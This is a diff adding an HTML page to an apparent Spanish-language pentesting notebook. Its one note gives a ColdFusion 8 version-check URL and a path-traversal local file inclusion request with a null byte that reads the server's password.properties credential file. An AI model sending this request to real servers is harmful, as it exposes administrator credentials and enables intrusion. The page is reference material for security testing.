@@ -1,0 +1,62 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>Adobe ColdFusion | Notebook</title>
+    <script src="/theme.js"></script>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell notebook-shell">
+      <a class="back-link" href="/notebook.html">~/notebook</a>
+
+      <section class="notebook-workspace" aria-label="Notebook">
+        <aside class="notebook-sidebar" aria-label="Explorador de apuntes" data-notebook-index></aside>
+
+        <article class="note-panel is-active" id="adobe-coldfusion">
+          <div class="note-tabbar">
+            <span>Adobe ColdFusion</span>
+            <details class="notebook-tag-search">
+              <summary>Buscar tags</summary>
+              <label>
+                <span>Tags de apuntes</span>
+                <input class="notebook-search-input" type="search" placeholder="Busca por herramienta, técnica o tag del apunte" autocomplete="off" />
+              </label>
+              <div class="notebook-search-results" aria-live="polite"></div>
+            </details>
+            <span>~/notebook/Aplicaciones Web/Servidores y plataformas web</span>
+          </div>
+
+          <div class="note-content">
+            <p class="eyebrow">aplicaciones web / servidores y plataformas web / adobe coldfusion</p>
+            <h2>Adobe ColdFusion</h2>
+
+            <h2>FCKeditor LFI en ColdFusion 8</h2>
+
+            <section class="code-card">
+              <h3>Comprobar versión y LFI</h3>
+              <pre><code># Comprobar versión
+http://ip/CFIDE/adminapi/base.cfc?wsdl
+
+# LFI
+http://ip/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en</code></pre>
+            </section>
+
+            <h2>Tags</h2>
+            <div class="tag-list">
+              <span>aplicaciones_web</span>
+              <span>coldfusion</span>
+              <span>lfi</span>
+              <span>fckeditor</span>
+            </div>
+          </div>
+        </article>
+      </section>
+    </main>
+    <script src="/notebook/index.js"></script>
+    <script src="/notebook/folder-state.js"></script>
+    <script src="/notebook/search.js"></script>
+  </body>
+</html>
